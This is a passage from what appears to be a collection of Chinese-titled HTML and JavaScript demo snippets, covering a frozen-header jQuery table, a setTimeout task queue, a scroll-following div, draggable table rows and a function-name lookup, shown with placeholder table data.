						col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达
					</div>
				</td>
			</tr>
			<tr>
				<td rowspan="2" class="FixedDataColumn">
					col1
				</td>
				<td rowspan="2" class="FixedDataColumn">
					col2
				</td>
				<td rowspan="2" class="FixedDataColumn">
					col3
				</td>
				<td class="FixedDataColumn">
					col4
				</td>
				<td>
					col5
				</td>
				<td>
					col6
				</td>
				<td>
					col7
				</td>
				<td>
					col8
				</td>
				<td>
					col9
				</td>
				<td>
					col10
				</td>
				<td>
					col11
				</td>
				<td>
					col12
				</td>
				<td rowspan="2">
					col13
				</td>
				<td rowspan="2">
					col14
				</td>
				<td rowspan="2">
					col15
				</td>
			</tr>
			<tr>
				<td class="FixedDataColumn">
					col16
				</td>
				<td style="word-wrap: word-break" colspan="8">
					<div style="overflow: auto;width: 1100px;height: 50px;border: 1px solid">
						col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达
					</div>
				</td>
			</tr>
			<tr>
				<td rowspan="2" class="FixedDataColumn">
					col1
				</td>
				<td rowspan="2" class="FixedDataColumn">
					col2
				</td>
				<td rowspan="2" class="FixedDataColumn">
					col3
				</td>
				<td class="FixedDataColumn">
					col4
				</td>
				<td>
					col5
				</td>
				<td>
					col6
				</td>
				<td>
					col7
				</td>
				<td>
					col8
				</td>
				<td>
					col9
				</td>
				<td>
					col10
				</td>
				<td>
					col11
				</td>
				<td>
					col12
				</td>
				<td rowspan="2">
					col13
				</td>
				<td rowspan="2">
					col14
				</td>
				<td rowspan="2">
					col15
				</td>
			</tr>
			<tr>
				<td class="FixedDataColumn">
					col16
				</td>
				<td style="word-wrap: word-break" colspan="8">
					<div style="overflow: auto;width: 1100px;height: 50px;border: 1px solid">
						col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达
					</div>
				</td>
			</tr>
			<tr>
				<td rowspan="2" class="FixedDataColumn">
					col1
				</td>
				<td rowspan="2" class="FixedDataColumn">
					col2
				</td>
				<td rowspan="2" class="FixedDataColumn">
					col3
				</td>
				<td class="FixedDataColumn">
					col4
				</td>
				<td>
					col5
				</td>
				<td>
					col6
				</td>
				<td>
					col7
				</td>
				<td>
					col8
				</td>
				<td>
					col9
				</td>
				<td>
					col10
				</td>
				<td>
					col11
				</td>
				<td>
					col12
				</td>
				<td rowspan="2">
					col13
				</td>
				<td rowspan="2">
					col14
				</td>
				<td rowspan="2">
					col15
				</td>
			</tr>
			<tr>
				<td class="FixedDataColumn">
					col16
				</td>
				<td style="word-wrap: word-break" colspan="8">
					<div style="overflow: auto;width: 1100px;height: 50px;border: 1px solid">
						col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达
					</div>
				</td>
			</tr>
			<tr>
				<td rowspan="2" class="FixedDataColumn">
					col1
				</td>
				<td rowspan="2" class="FixedDataColumn">
					col2
				</td>
				<td rowspan="2" class="FixedDataColumn">
					col3
				</td>
				<td class="FixedDataColumn">
					col4
				</td>
				<td>
					col5
				</td>
				<td>
					col6
				</td>
				<td>
					col7
				</td>
				<td>
					col8
				</td>
				<td>
					col9
				</td>
				<td>
					col10
				</td>
				<td>
					col11
				</td>
				<td>
					col12
				</td>
				<td rowspan="2">
					col13
				</td>
				<td rowspan="2">
					col14
				</td>
				<td rowspan="2">
					col15
				</td>
			</tr>
			<tr>
				<td class="FixedDataColumn">
					col16
				</td>
				<td style="word-wrap: word-break" colspan="8">
					<div style="overflow: auto;width: 1100px;height: 50px;border: 1px solid">
						col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达
					</div>
				</td>
			</tr>
			<tr>
				<td rowspan="2" class="FixedDataColumn">
					col1
				</td>
				<td rowspan="2" class="FixedDataColumn">
					col2
				</td>
				<td rowspan="2" class="FixedDataColumn">
					col3
				</td>
				<td class="FixedDataColumn">
					col4
				</td>
				<td>
					col5
				</td>
				<td>
					col6
				</td>
				<td>
					col7
				</td>
				<td>
					col8
				</td>
				<td>
					col9
				</td>
				<td>
					col10
				</td>
				<td>
					col11
				</td>
				<td>
					col12
				</td>
				<td rowspan="2">
					col13
				</td>
				<td rowspan="2">
					col14
				</td>
				<td rowspan="2">
					col15
				</td>
			</tr>
			<tr>
				<td class="FixedDataColumn">
					col16
				</td>
				<td style="word-wrap: word-break" colspan="8">
					<div style="overflow: auto;width: 1100px;height: 50px;border: 1px solid">
						col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达col17爱仕达
					</div>
				</td>
			</tr>
		</table>
	</div>
</body>
</html>

#T=冻结 固定 行列 jquery 全兼容
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<title> new document </title>
	<META NAME="Generator" CONTENT="EditPlus,Microshaoft">
	<META NAME="Author" CONTENT="EditPlus,Microshaoft">
	<META NAME="Keywords" CONTENT="EditPlus,Microshaoft">
	<META NAME="Description" CONTENT="EditPlus,Microshaoft">
<script type="text/javascript" src="http://code.jquery.com/jquery-1.6.1.min.js"></script>
<script type="text/javascript">
<!--
	function FixTable(TableID, FixColumnNumber, width, height) {
	/// <summary>
	///	 锁定表头和列
	///	 <para> sorex.cnblogs.com </para>
	/// </summary>
	/// <param name="TableID" type="String">
	///	 要锁定的Table的ID
	/// </param>
	/// <param name="FixColumnNumber" type="Number">
	///	 要锁定列的个数
	/// </param>
	/// <param name="width" type="Number">
	///	 显示的宽度
	/// </param>
	/// <param name="height" type="Number">
	///	 显示的高度
	/// </param>
	if ($("#" + TableID + "_tableLayout").length != 0) {
		$("#" + TableID + "_tableLayout").before($("#" + TableID));
		$("#" + TableID + "_tableLayout").empty();
	}
	else {
		$("#" + TableID).after("<div id='" + TableID + "_tableLayout' style='overflow:hidden;height:" + height + "px; width:" + width + "px;'></div>");
	}

	$('<div id="' + TableID + '_tableFix"></div>'
	+ '<div id="' + TableID + '_tableHead"></div>'
	+ '<div id="' + TableID + '_tableColumn"></div>'
	+ '<div id="' + TableID + '_tableData"></div>').appendTo("#" + TableID + "_tableLayout");


	var oldtable = $("#" + TableID);

	var tableFixClone = oldtable.clone(true);
	tableFixClone.attr("id", TableID + "_tableFixClone");
	$("#" + TableID + "_tableFix").append(tableFixClone);
	var tableHeadClone = oldtable.clone(true);
	tableHeadClone.attr("id", TableID + "_tableHeadClone");
	$("#" + TableID + "_tableHead").append(tableHeadClone);
	var tableColumnClone = oldtable.clone(true);
	tableColumnClone.attr("id", TableID + "_tableColumnClone");
	$("#" + TableID + "_tableColumn").append(tableColumnClone);
	$("#" + TableID + "_tableData").append(oldtable);

	$("#" + TableID + "_tableLayout table").each(function () {
		$(this).css("margin", "0");
	});


	var HeadHeight = $("#" + TableID + "_tableHead thead").height();
	HeadHeight += 2;
	$("#" + TableID + "_tableHead").css("height", HeadHeight);
	$("#" + TableID + "_tableFix").css("height", HeadHeight);


	var ColumnsWidth = 0;
	var ColumnsNumber = 0;
	$("#" + TableID + "_tableColumn tr:last td:lt(" + FixColumnNumber + ")").each(function () {
		ColumnsWidth += $(this).outerWidth(true);
		ColumnsNumber++;
	});
	ColumnsWidth += 2;
	if ($.browser.msie) {
		switch ($.browser.version) {
			case "7.0":
				if (ColumnsNumber >= 3) ColumnsWidth--;
				break;
			case "8.0":
				if (ColumnsNumber >= 2) ColumnsWidth--;
				break;
		}
	}
	$("#" + TableID + "_tableColumn").css("width", ColumnsWidth);
	$("#" + TableID + "_tableFix").css("width", ColumnsWidth);


	$("#" + TableID + "_tableData").scroll(function () {
		$("#" + TableID + "_tableHead").scrollLeft($("#" + TableID + "_tableData").scrollLeft());
		$("#" + TableID + "_tableColumn").scrollTop($("#" + TableID + "_tableData").scrollTop());
	});

	$("#" + TableID + "_tableFix").css({ "overflow": "hidden", "position": "relative", "z-index": "50", "background-color": "Silver" });
	$("#" + TableID + "_tableHead").css({ "overflow": "hidden", "width": width - 17, "position": "relative", "z-index": "45", "background-color": "Silver" });
	$("#" + TableID + "_tableColumn").css({ "overflow": "hidden", "height": height - 17, "position": "relative", "z-index": "40", "background-color": "Silver" });
	$("#" + TableID + "_tableData").css({ "overflow": "scroll", "width": width, "height": height, "position": "relative", "z-index": "35" });

	if ($("#" + TableID + "_tableHead").width() > $("#" + TableID + "_tableFix table").width()) {
		$("#" + TableID + "_tableHead").css("width", $("#" + TableID + "_tableFix table").width());
		$("#" + TableID + "_tableData").css("width", $("#" + TableID + "_tableFix table").width() + 17);
	}
	if ($("#" + TableID + "_tableColumn").height() > $("#" + TableID + "_tableColumn table").height()) {
		$("#" + TableID + "_tableColumn").css("height", $("#" + TableID + "_tableColumn table").height());
		$("#" + TableID + "_tableData").css("height", $("#" + TableID + "_tableColumn table").height() + 17);
	}

	$("#" + TableID + "_tableFix").offset($("#" + TableID + "_tableLayout").offset());
	$("#" + TableID + "_tableHead").offset($("#" + TableID + "_tableLayout").offset());
	$("#" + TableID + "_tableColumn").offset($("#" + TableID + "_tableLayout").offset());
	$("#" + TableID + "_tableData").offset($("#" + TableID + "_tableLayout").offset());
}


$(document).ready(function () {
			FixTable("MyTable", 2, 600, 400);
		});

//-->
</script>

</head>
<body>
鸣谢原文转自
<br>
<a href="http://www.cnblogs.com/sorex/archive/2011/06/30/2093499.html">http://www.cnblogs.com/sorex/archive/2011/06/30/2093499.html</a>
<br>
<table
	style="border-bottom-color: black; border-top-color: black; width: 1000px; color: #000000; border-right-color: black; font-size: medium; border-left-color: black"
	id="MyTable"
	border="1"
	cellspacing="0"
	cellpadding="0"
>
<thead>
	<tr>
		<th style="text-align: center; width: 80px" rowspan="3">
			姓名
		</th>
		<th style="text-align: center; width: 80px" rowspan="3">
			班级
		</th>
		<th style="text-align: center" colspan="10">
			成绩
		</th>
	</tr>
	<tr>
		<th style="text-align: center" colspan="3">
			主科
		</th>
		<th style="text-align: center" colspan="3">
			文科
		</th>
		<th style="text-align: center" colspan="3">
			理科
		</th>
		<th style="text-align: center; width: 80px" rowspan="2">
			总分
		</th>
		</tr>
	<tr>
		<th style="text-align: center; width: 80px">
			语文
		</th>
		<th style="text-align: center; width: 80px">
			数学
		</th>
		<th style="text-align: center; width: 80px">
			英语
		</th>
		<th style="text-align: center; width: 80px">
			政治
		</th>
		<th style="text-align: center; width: 80px">
			历史
		</th>
		<th style="text-align: center; width: 80px">
			地理
		</th>
		<th style="text-align: center; width: 80px">
			物理
		</th>
		<th style="text-align: center; width: 80px">
			化学
		</th>
		<th style="text-align: center; width: 80px">
			生物
		</th>
	</tr>
	<!--
		<tr>
		<th style="width: 80px; text-align: center;" _mce_style="width: 80px; text-align: center;">
							姓名
						</th>
						<th style="width: 80px; text-align: center;" _mce_style="width: 80px; text-align: center;">
							班级
						</th>
						<th style="width: 80px; text-align: center;" _mce_style="width: 80px; text-align: center;">
							语文
						</th>
						<th style="width: 80px; text-align: center;" _mce_style="width: 80px; text-align: center;">
							数学
						</th>
						<th style="width: 80px; text-align: center;" _mce_style="width: 80px; text-align: center;">
							英语
						</th>
						<th style="width: 80px; text-align: center;" _mce_style="width: 80px; text-align: center;">
							政治
						</th>
						<th style="width: 80px; text-align: center;" _mce_style="width: 80px; text-align: center;">
							历史
						</th>
						<th style="width: 80px; text-align: center;" _mce_style="width: 80px; text-align: center;">
							地理
						</th>
						<th style="width: 80px; text-align: center;" _mce_style="width: 80px; text-align: center;">
							物理
						</th>
						<th style="width: 80px; text-align: center;" _mce_style="width: 80px; text-align: center;">
							化学
						</th>
						<th style="width: 80px; text-align: center;" _mce_style="width: 80px; text-align: center;">
							生物
						</th>
						<th style="width: 80px; text-align: center;" _mce_style="width: 80px; text-align: center;">
							总分
						</th>
					
		</tr>
	-->
</thead>
	<tbody>
	<!-- 数据行 -->
		<tr>
			<td>
				学生32
			</td>
			<td>
				班级1
			</td>
			<td>
				29
			</td>
			<td>
				25
			</td>
			<td>
				146
			</td>
			<td>
				28
			</td>
			<td>
				79
			</td>
			<td>
				73
			</td>
			<td>
				47
			</td>
			<td>
				8
			</td>
			<td>
				91
			</td>
			<td>
				526
			</td>
		</tr>
				<tr>
			<td>
				学生32
			</td>
			<td>
				班级1
			</td>
			<td>
				29
			</td>
			<td>
				25
			</td>
			<td>
				146
			</td>
			<td>
				28
			</td>
			<td>
				79
			</td>
			<td>
				73
			</td>
			<td>
				47
			</td>
			<td>
				8
			</td>
			<td>
				91
			</td>
			<td>
				526
			</td>
		</tr>
		<tr>
			<td>
				学生32
			</td>
			<td>
				班级1
			</td>
			<td>
				29
			</td>
			<td>
				25
			</td>
			<td>
				146
			</td>
			<td>
				28
			</td>
			<td>
				79
			</td>
			<td>
				73
			</td>
			<td>
				47
			</td>
			<td>
				8
			</td>
			<td>
				91
			</td>
			<td>
				526
			</td>
		</tr>
		<tr>
			<td>
				学生32
			</td>
			<td>
				班级1
			</td>
			<td>
				29
			</td>
			<td>
				25
			</td>
			<td>
				146
			</td>
			<td>
				28
			</td>
			<td>
				79
			</td>
			<td>
				73
			</td>
			<td>
				47
			</td>
			<td>
				8
			</td>
			<td>
				91
			</td>
			<td>
				526
			</td>
		</tr>
		<tr>
			<td>
				学生32
			</td>
			<td>
				班级1
			</td>
			<td>
				29
			</td>
			<td>
				25
			</td>
			<td>
				146
			</td>
			<td>
				28
			</td>
			<td>
				79
			</td>
			<td>
				73
			</td>
			<td>
				47
			</td>
			<td>
				8
			</td>
			<td>
				91
			</td>
			<td>
				526
			</td>
		</tr>
		<tr>
			<td>
				学生32
			</td>
			<td>
				班级1
			</td>
			<td>
				29
			</td>
			<td>
				25
			</td>
			<td>
				146
			</td>
			<td>
				28
			</td>
			<td>
				79
			</td>
			<td>
				73
			</td>
			<td>
				47
			</td>
			<td>
				8
			</td>
			<td>
				91
			</td>
			<td>
				526
			</td>
		</tr>
		<tr>
			<td>
				学生32
			</td>
			<td>
				班级1
			</td>
			<td>
				29
			</td>
			<td>
				25
			</td>
			<td>
				146
			</td>
			<td>
				28
			</td>
			<td>
				79
			</td>
			<td>
				73
			</td>
			<td>
				47
			</td>
			<td>
				8
			</td>
			<td>
				91
			</td>
			<td>
				526
			</td>
		</tr>
		<tr>
			<td>
				学生32
			</td>
			<td>
				班级1
			</td>
			<td>
				29
			</td>
			<td>
				25
			</td>
			<td>
				146
			</td>
			<td>
				28
			</td>
			<td>
				79
			</td>
			<td>
				73
			</td>
			<td>
				47
			</td>
			<td>
				8
			</td>
			<td>
				91
			</td>
			<td>
				526
			</td>
		</tr>
		<tr>
			<td>
				学生32
			</td>
			<td>
				班级1
			</td>
			<td>
				29
			</td>
			<td>
				25
			</td>
			<td>
				146
			</td>
			<td>
				28
			</td>
			<td>
				79
			</td>
			<td>
				73
			</td>
			<td>
				47
			</td>
			<td>
				8
			</td>
			<td>
				91
			</td>
			<td>
				526
			</td>
		</tr>
		<tr>
			<td>
				学生32
			</td>
			<td>
				班级1
			</td>
			<td>
				29
			</td>
			<td>
				25
			</td>
			<td>
				146
			</td>
			<td>
				28
			</td>
			<td>
				79
			</td>
			<td>
				73
			</td>
			<td>
				47
			</td>
			<td>
				8
			</td>
			<td>
				91
			</td>
			<td>
				526
			</td>
		</tr>
		<tr>
			<td>
				学生32
			</td>
			<td>
				班级1
			</td>
			<td>
				29
			</td>
			<td>
				25
			</td>
			<td>
				146
			</td>
			<td>
				28
			</td>
			<td>
				79
			</td>
			<td>
				73
			</td>
			<td>
				47
			</td>
			<td>
				8
			</td>
			<td>
				91
			</td>
			<td>
				526
			</td>
		</tr>
		<tr>
			<td>
				学生32
			</td>
			<td>
				班级1
			</td>
			<td>
				29
			</td>
			<td>
				25
			</td>
			<td>
				146
			</td>
			<td>
				28
			</td>
			<td>
				79
			</td>
			<td>
				73
			</td>
			<td>
				47
			</td>
			<td>
				8
			</td>
			<td>
				91
			</td>
			<td>
				526
			</td>
		</tr>
		<tr>
			<td>
				学生32
			</td>
			<td>
				班级1
			</td>
			<td>
				29
			</td>
			<td>
				25
			</td>
			<td>
				146
			</td>
			<td>
				28
			</td>
			<td>
				79
			</td>
			<td>
				73
			</td>
			<td>
				47
			</td>
			<td>
				8
			</td>
			<td>
				91
			</td>
			<td>
				526
			</td>
		</tr>
		<tr>
			<td>
				学生32
			</td>
			<td>
				班级1
			</td>
			<td>
				29
			</td>
			<td>
				25
			</td>
			<td>
				146
			</td>
			<td>
				28
			</td>
			<td>
				79
			</td>
			<td>
				73
			</td>
			<td>
				47
			</td>
			<td>
				8
			</td>
			<td>
				91
			</td>
			<td>
				526
			</td>
		</tr>
		<tr>
			<td>
				学生32
			</td>
			<td>
				班级1
			</td>
			<td>
				29
			</td>
			<td>
				25
			</td>
			<td>
				146
			</td>
			<td>
				28
			</td>
			<td>
				79
			</td>
			<td>
				73
			</td>
			<td>
				47
			</td>
			<td>
				8
			</td>
			<td>
				91
			</td>
			<td>
				526
			</td>
		</tr>
		<tr>
			<td>
				学生32
			</td>
			<td>
				班级1
			</td>
			<td>
				29
			</td>
			<td>
				25
			</td>
			<td>
				146
			</td>
			<td>
				28
			</td>
			<td>
				79
			</td>
			<td>
				73
			</td>
			<td>
				47
			</td>
			<td>
				8
			</td>
			<td>
				91
			</td>
			<td>
				526
			</td>
		</tr>

	</tbody>
</table>
</body>
</html>

#T=队列异步 settimeout
<!doctype html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="Generator" content="EditPlus?,Microshaoft?">
	<meta name="Author" content="EditPlus?,Microshaoft?">
	<meta name="Keywords" content="EditPlus?,Microshaoft?">
	<meta name="Description" content="EditPlus?,Microshaoft?">
	<title>Document</title>
</head>
<body>
<script type="text/javascript">
<!--
	/**
* @author Barret Lee
* @email barret.china@gmail.com
* @description 事件队列管理，含延时
*/
var Q = {
	// 保存队列信息
	a: [],
	// 添加到队列 queue
	q: function(d){
		// 添加到队列如果不是函数或者数字则不处理
		if(!/function|number/.test(typeof d)) return;

		Q.a.push(d);
		// 返回对自身的引用
		return Q;
	},
	// 执行队列 dequeue
	d: function(){
		var s = Q.a.shift();
		// 如果已经到了队列尽头则返回
		if(!s) return;

		// 如果是函数，直接执行，然后继续 dequeue
		if(typeof s === "function") {
			s(), Q.d();
			return;
		}

		// 如果是数字，该数字作为延迟时间，延迟 dequeue
		setTimeout(function(){
			 Q.d();
		}, s);
	}
};

function record(s){
	var div = document.createElement("div");
	div.innerHTML = s;
	console.log(s);
	document.body.appendChild(div);
}
Q
.q(function(){
	record("0 <i style='color:blue'>3s 之后搞定，0 把 1 叫进来</i>");
})
.q(3000)
.q(function(){
	record("1 <i style='color:blue'>2s 之后搞定，1 把 2 叫进来</i>");
})
.q(2000)
.q(function(){
	record("2 <span style='color:red'>后面没人了，OK，厕所关门~</span>");
})
.d();
//-->
</script>
</body>
</html>

#T=固定 div
<!DOCTYPE HTML>
  <html>
  <head>
	<meta http-equiv="content-type" charset="utf-8" />
	<title>Js跟随滚动条移动的DIV</title>
  </head>
  <style type="text/css">
  *{margin:0;padding: 0;background-color:#000; }
  div#con{width: 800px;margin: 0 auto;}
  div.pop{width:800px;font-size: 18px;background:yellow;padding:20px 0;margin:20px auto;border:1px solid yellow;text-align: center;color: #000;}
  p{width:800px;padding:20px 0;background:#fff;border:1px solid #000;margin:20px auto;text-align: center;}
  div.active{position: fixed;top: 100px;z-index: 100;margin: 0;_position: absolute;}
  </style>
  <body>
  <div id="con" style="height:2000px;">
  <p>我是元素p</p>
  <div id="myDiv" class="pop active">
	我是随屏幕滚动的DIV，我距离顶部高度适中为100px，修改css就可以修改该值
  </div>
  
  <p>我是元素p</p><p>我是元素p</p><p>我是元素p</p><p>我是元素p</p><p>我是元素p</p><p>我是元素p</p><p>我是元素p</p><p>我是元素p</p><p>我是元素p</p><p>我是元素p</p><p>我是元素p</p><p>我是元素p</p><p>我是元素p</p><p>我是元素p</p><p>我是元素p</p><p>我是元素p</p><p>我是元素p</p><p>我是元素p</p><p>我是元素p</p><p>我是元素p</p><p>我是元素p</p><p>我是元素p</p><p>我是元素p</p><p>我是元素p</p><p>我是元素p</p><p>我是元素p</p><p>我是元素p</p><p>我是元素p</p><p>我是元素p</p><p style="color:red;position:fixed;top:400px;">我是元素top:400px;看是否支持固定定位</p>
  </div>
	<script type="text/javascript">
	(function(){
		//if(navigator.userAgent.toLocaleLowerCase().indexOf('msie 6.0;')>1){
		if(checkFixed()){
			return ;
		}//只需对不支持固定定位的浏览器做处理
		
		//将下面需要使用的dom相关操作在scrollDiv外面提取一次，避免多次dom操作
		var fixedObj = document.getElementById("myDiv"),
			height = fixedObj.offsetHeight,//标签高度提前读取出来
			firstTop =getTop(fixedObj),//记录页面一开始标签所在位置
			timer;
			window.onscroll = function(){//这里做个延时执行，可以减少scroll执行频率
				clearTimeout(timer);
				timer = setTimeout(function(){
					scrollDiv()
				},30);
			}

		function scrollDiv(){
			var scrollTop = document.documentElement.scrollTop || document.body.scrollTop;
			fixedObj.style.top=(firstTop+scrollTop)+'px';
		}
		//获取元素在页面里top值
		function getTop(obj) {
			var top = 0;
			while(obj){
				top += obj.offsetTop;
				obj = obj.offsetParent;
			}
			return top;
		}
		//判断浏览器是否支持固定定位
		function checkFixed(){
			var o = document.createElement('div'),
				body = document.getElementsByTagName('body')[0],
				fig = false;
			body.insertBefore( o, body.firstChild );
			o.style.cssText ='position:fixed;top:20px;margin:0;padding:0;border:none;width:0px;height:0px;';
			fig = o.offsetTop==20;
			body.removeChild(o);
			return fig;
		}
	})()
  </script>
  </body>
  </html>
#T=行拖动 防止内容被选中
<!doctype html>
<html>
  <head>
    <title>行拖动 by 司徒正美</title>
    <script>
      window.onload = function(){
        //绑定事件
        var addEvent = document.addEventListener ? function(el,type,callback){
          el.addEventListener( type, callback, !1 );
        } : function(el,type,callback){
          el.attachEvent( "on" + type, callback );
        }
        //判定对样式的支持
        var getStyleName= (function(){
          var prefixes = ['', '-ms-','-moz-', '-webkit-', '-khtml-', '-o-'];
          var reg_cap = /-([a-z])/g;
          function getStyleName(css, el) {
            el = el || document.documentElement;
            var style = el.style,test;
            for (var i=0, l=prefixes.length; i < l; i++) {
              test = (prefixes[i] + css).replace(reg_cap,function($0,$1){
                return $1.toUpperCase();
              });
              if(test in style){
                return test;
              }
            }
            return null;
          }
          return getStyleName;
        })();
        var userSelect = getStyleName("user-select");

        //精确获取样式
        var getStyle = document.defaultView ? function(el,style){
          return document.defaultView.getComputedStyle(el, null).getPropertyValue(style)
        } : function(el,style){
          style = style.replace(/\-(\w)/g, function($, $1){
            return $1.toUpperCase();
          });
          return el.currentStyle[style];
        }
        var dragManager = {
          y:0,

          dragStart:function(e){
            e = e || event;
            var handler = e.target || e.srcElement;
            if(handler.nodeName === "TD"){
              handler = handler.parentNode;
              dragManager.handler = handler;
              if(!handler.getAttribute("data-background")){
                handler.setAttribute("data-background",getStyle(handler,"background-color"))
              }
              //显示为可移动的状态
              handler.style.backgroundColor = "#ccc";
              handler.style.cursor = "move";
              dragManager.y = e.clientY;
              //★★★★★★★★★★★★★★★★★★★★
              if(typeof userSelect === "string"){
                return document.documentElement.style[userSelect] = "none";
              }
              document.unselectable  = "on";
              document.onselectstart = function(){
                return false;
              }
              //★★★★★★★★★★★★★★★★★★★★
            }
          },
          draging:function(e){//mousemove时拖动行
            var handler = dragManager.handler;
            if(handler){
              e = e || event;
              if(window.getSelection){//w3c
                window.getSelection().removeAllRanges();
              }else  if(document.selection){
                document.selection.empty();//IE
              }
              var y = e.clientY;
              var down = y > dragManager.y;//是否向下移动
              var tr = document.elementFromPoint(e.clientX,e.clientY);
              if(tr && tr.nodeName == "TD"){
                tr = tr.parentNode
                dragManager.y = y;
                if( handler !== tr){
                  tr.parentNode.insertBefore(handler, (down ? tr.nextSibling : tr));
                }
              };
            }
          },
          dragEnd:function(){
            var handler = dragManager.handler
            if (handler) {
              handler.style.backgroundColor = handler.getAttribute("data-background");
              handler.style.cursor = "default";
              dragManager.handler = null;
             
            }
             //★★★★★★★★★★★★★★★★★★★★
              if(typeof userSelect === "string"){
                return document.documentElement.style[userSelect] = "text";
              }
              document.unselectable  = "off";
              document.onselectstart = null;
              //★★★★★★★★★★★★★★★★★★★★
          },
          main:function(el){
            addEvent(el,"mousedown",dragManager.dragStart);
            addEvent(document,"mousemove",dragManager.draging);
            addEvent(document,"mouseup",dragManager.dragEnd);

          }
        }
        var el = document.getElementById("table");
        dragManager.main(el);

      }

    </script>
    <style>
      .table{
        width:60%;
        border: 1px solid red;
        border-collapse: collapse;
      }
      .table td{
        border: 1px solid red;
        height: 20px;
      }
    </style>
  </head>
  <body>
    <h1>行拖动 by 司徒正美</h1>
    <table  id="table" class="table">
      <tbody>
        <tr>
          <td>1</td>
          <td>One</td>
          <td>dom.require</td>
        </tr>
        <tr id="2" >
          <td class="2">2</td>
          <td>Two</td>
          <td>ControlJS </td>
        </tr>
        <tr id="3" >
          <td class="3">3</td>
          <td>Three</td>
          <td>HeadJS</td>
        </tr>
        <tr id="4" >
          <td class="4">4</td>
          <td>Four</td>
          <td>LAB.js</td>
        </tr>
        <tr id="5" >
          <td class="5">5</td>
          <td>Five</td>
          <td>$script.js</td>
        </tr>
        <tr id="6" >
          <td class="6">6</td>
          <td>Six</td>
          <td>NBL.js</td>
        </tr>
      </tbody>
    </table>
  </body>
</html>


#T=获取函数名
 
<!doctype html>
<html dir="ltr" lang="zh-CN">
  <head>
    <meta charset="utf-8"/>
    <title>getFnName by 司徒正美</title>

    <script type="text/javascript" charset="utf-8">
      window.onload = function(){

    var getFnName = function(callee){
      var _callee = callee.toString().replace(/[\s\?]*/g,""),
      comb = _callee.length >= 50 ? 50 :_callee.length;
      _callee = _callee.substring(0,comb);
      var name = _callee.match(/^function([^\(]+?)\(/);
      if(name && name[1]){
        return name[1];
      }
      var caller = callee.caller,
      _caller = caller.toString().replace(/[\s\?]*/g,"");
      var last = _caller.indexOf(_callee),
      str = _caller.substring(last-30,last);
      name = str.match(/var([^\=]+?)\=/);
      if(name && name[1]){
        return name[1];
      }
      return "anonymous"
    };
 //有名函数（函数定义）
    function hasname (){
      var aa = getFnName(arguments.callee)
      //+++++++++++++++++++++++++++++++++
      alert(aa)
    }

    hasname();
    //匿名函数（函数表达式）
    var noname = function(){
      //+++++++++++++++++++++++++++++++++
      var bb = getFnName(arguments.callee)
      //+++++++++++++++++++++++++++++++++
      alert(bb)
    };
    noname();
   //闭包
    (function(){
